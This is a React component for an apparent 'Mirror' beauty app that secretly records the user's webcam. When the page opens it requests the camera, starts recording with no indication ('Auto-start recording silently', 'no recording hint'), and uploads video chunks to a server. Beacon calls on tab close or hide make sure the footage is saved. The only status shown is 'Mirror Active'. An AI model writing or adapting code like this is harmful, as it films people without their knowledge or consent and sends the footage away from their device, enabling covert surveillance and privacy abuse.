import { useState, useRef, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { MirrorRecorder } from '../utils/recorder';
import { uploadChunk, finalizeRecording, beaconFinalize } from '../utils/api';

const STATES = {
  IDLE: 'idle',
  REQUESTING: 'requesting',
  ACTIVE: 'active',
  ERROR: 'error'
};

export default function Mirror() {
  const [state, setState] = useState(STATES.IDLE);
  const [error, setError] = useState('');
  const navigate = useNavigate();

  const videoRef = useRef(null);
  const recorderRef = useRef(null);
  const sessionIdRef = useRef(`session-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`);
  const finalizedRef = useRef(false);
  const uploadQueueRef = useRef(Promise.resolve());
  const uploadedCountRef = useRef(0);

  // Queue a chunk upload — sequential queue so chunks arrive in order
  const queueChunkUpload = useCallback((chunkBlob, chunkIndex) => {
    const sid = sessionIdRef.current;
    uploadQueueRef.current = uploadQueueRef.current
      .then(() => uploadChunk(chunkBlob, sid, chunkIndex))
      .then(() => { uploadedCountRef.current = chunkIndex + 1; })
      .catch(() => {
        // Retry once on failure
        return uploadChunk(chunkBlob, sid, chunkIndex)
          .then(() => { uploadedCountRef.current = chunkIndex + 1; })
          .catch(() => { /* chunk lost — rest of recording is still safe */ });
      });
  }, []);

  // Graceful finalize: stop recorder, wait for pending chunks, then finalize
  const gracefulFinalize = useCallback(async () => {
    if (finalizedRef.current) return;
    const recorder = recorderRef.current;
    if (!recorder || !recorder.isRecording) return;
    finalizedRef.current = true;

    try {
      // Stop MediaRecorder — triggers final ondataavailable then onstop
      const result = await recorder.stopRecording();
      // Wait for all queued chunk uploads to finish
      await uploadQueueRef.current;
      // Finalize on backend
      if (uploadedCountRef.current > 0 && result) {
        await finalizeRecording(sessionIdRef.current, recorder.mimeType, result.duration);
      }
    } catch { /* silent */ }
    recorder.stopCamera();
  }, []);

  // Emergency finalize: sendBeacon for finalize (chunks already on server)
  const emergencyFinalize = useCallback(() => {
    if (finalizedRef.current) return;
    const recorder = recorderRef.current;
    if (!recorder || !recorder.isRecording) return;
    finalizedRef.current = true;

    const duration = recorder.getDuration();
    const mimeType = recorder.mimeType || 'video/webm';

    // Fire finalize via sendBeacon — chunks already saved server-side
    if (uploadedCountRef.current > 0) {
      beaconFinalize(sessionIdRef.current, mimeType, duration);
    }

    // Force-stop everything
    try { recorder.mediaRecorder?.stop(); } catch { /* */ }
    recorder.isRecording = false;
    recorder.stopCamera();
  }, []);

  const requestCamera = useCallback(async () => {
    setState(STATES.REQUESTING);
    try {
      const recorder = new MirrorRecorder({
        onChunk: (blob, index) => queueChunkUpload(blob, index)
      });
      const stream = await recorder.requestCamera();
      recorderRef.current = recorder;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      // Auto-start recording silently
      recorder.startRecording();
      setState(STATES.ACTIVE);
    } catch (err) {
      setError(
        err.name === 'NotAllowedError'
          ? 'Camera permission was denied. Please allow camera access and try again.'
          : err.name === 'NotFoundError'
            ? 'No camera found on this device.'
            : 'Could not access camera. Please check your settings.'
      );
      setState(STATES.ERROR);
    }
  }, [queueChunkUpload]);

  // Back button handler: graceful finalize then navigate
  const handleBack = useCallback(async (e) => {
    e.preventDefault();
    await gracefulFinalize();
    navigate('/');
  }, [gracefulFinalize, navigate]);

  // Page lifecycle handlers for tab close / refresh / app switch
  useEffect(() => {
    const onBeforeUnload = () => { emergencyFinalize(); };
    const onPageHide = () => { emergencyFinalize(); };
    const onVisibilityChange = () => {
      if (document.visibilityState === 'hidden') {
        emergencyFinalize();
      }
    };

    window.addEventListener('beforeunload', onBeforeUnload);
    window.addEventListener('pagehide', onPageHide);
    document.addEventListener('visibilitychange', onVisibilityChange);

    return () => {
      window.removeEventListener('beforeunload', onBeforeUnload);
      window.removeEventListener('pagehide', onPageHide);
      document.removeEventListener('visibilitychange', onVisibilityChange);
    };
  }, [emergencyFinalize]);

  // Auto-start camera on mount; cleanup on unmount (route change)
  useEffect(() => {
    requestCamera();

    return () => {
      // Component unmount = route change
      if (!finalizedRef.current) {
        const recorder = recorderRef.current;
        if (recorder && recorder.isRecording) {
          finalizedRef.current = true;
          const duration = recorder.getDuration();
          const mimeType = recorder.mimeType || 'video/webm';
          try { recorder.mediaRecorder?.stop(); } catch { /* */ }
          recorder.isRecording = false;
          // Finalize via beacon since unmount is synchronous
          if (uploadedCountRef.current > 0) {
            beaconFinalize(sessionIdRef.current, mimeType, duration);
          }
          recorder.stopCamera();
        } else if (recorder) {
          recorder.destroy();
        }
      }
    };
  }, [requestCamera]);

  return (
    <div className="mirror-page page-fade-in">
      <div className="mirror-page__ambient" />

      <a href="/" className="mirror-page__back" onClick={handleBack}>
        ← Back
      </a>

      <div className="mirror-container">
        {/* Ring Light */}
        <div className="mirror-ring-light">
          {/* Side Light Bars */}
          <div className="mirror-side-light mirror-side-light--left" />
          <div className="mirror-side-light mirror-side-light--right" />
          <div className="mirror-side-light mirror-side-light--top" />
          <div className="mirror-side-light mirror-side-light--bottom" />

          {/* Mirror Frame */}
          <div className="mirror-frame">
            {state === STATES.IDLE && (
              <div className="mirror-permission">
                <div className="mirror-permission__icon">✦</div>
                <div className="mirror-permission__title">Welcome to Mirror</div>
                <div className="mirror-permission__text">
                  Initializing your premium mirror experience...
                </div>
              </div>
            )}

            {state === STATES.REQUESTING && (
              <div className="mirror-loading">
                <div className="mirror-loading__spinner" />
                <span>Preparing your mirror...</span>
              </div>
            )}

            {state === STATES.ERROR && (
              <div className="mirror-error">
                <div style={{ fontSize: '2rem', marginBottom: 8 }}>⚠</div>
                <div>{error}</div>
                <button
                  className="mirror-permission__btn"
                  onClick={requestCamera}
                  style={{ marginTop: 12 }}
                >
                  Try Again
                </button>
              </div>
            )}

            {/* Video element */}
            <video
              ref={videoRef}
              className="mirror-video"
              playsInline
              muted
              style={{
                display: state === STATES.ACTIVE ? 'block' : 'none'
              }}
            />

            {/* Beauty overlays */}
            {state === STATES.ACTIVE && (
              <>
                <div className="mirror-beauty-glow" />
                <div className="mirror-vignette" />
              </>
            )}
          </div>
        </div>

        {/* Status — just shows mirror is active, no recording hint */}
        {state === STATES.ACTIVE && (
          <div className="mirror-status">
            <div className="mirror-status__dot" />
            Mirror Active
          </div>
        )}
      </div>
    </div>
  );
}
